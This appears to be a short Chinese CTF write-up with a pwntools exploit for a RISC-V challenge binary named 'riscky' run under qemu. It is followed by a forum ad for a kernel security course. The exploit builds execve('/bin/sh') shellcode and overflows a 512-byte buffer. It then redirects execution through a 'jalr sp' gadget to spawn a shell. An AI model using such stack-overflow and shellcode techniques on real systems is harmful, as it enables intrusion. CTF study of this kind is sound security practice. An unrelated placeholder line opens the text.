
进入`/path/to/xxx`目录，找到`xxx.json`。

`from` `pwn` `import` `*`
`binary` `=` `ELF`(`'./riscky'`, checksec`=`False`)  
`context.arch` `=` `'riscv'`  
`context.bits` `=` `64`  
`p` `=` `process`(`'qemu-riscv64 riscky'`.split())  
`shellcode` `=` `asm`(f`'''`
`li s1, {'0x' + bytes.hex(b'/bin/sh'[::-1])}`
`sd s1, -16(sp)              # Store dword s1 on the stack`
`addi a0,sp,-16              # a0 = filename = sp + (-16)`
`slt a1,zero,-1              # a1 = argv set to 0`
`slt a2,zero,-1              # a2 = envp set to 0`
`li a7, 221                  # execve = 221`
`ecall                       # Do syscall`
`'''`)  
`if` `args.D:` `print`(`disasm(shellcode))`  
`payload` `=` `b''`  
`payload` `+=` (`520` `-` `8`) `*` `b`'A'` `#先填充512字节垃圾数据，因为是从sp+8处开始读入的，所以填512字节足矣`  
`payload` `+=` `p64`(`0x1060c`) `#0x1060c   jalr            sp   劫持程序流所用的gadget`  
`payload` `+=` `shellcode` `#在addi sp,sp,528之后sp为shellcode的地址`  
`p.sendlineafter(b'> ', payload)`  
`p.interactive()`

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [riscky.rar](javascript:void(0);)

  （263.70kb，9次下载）
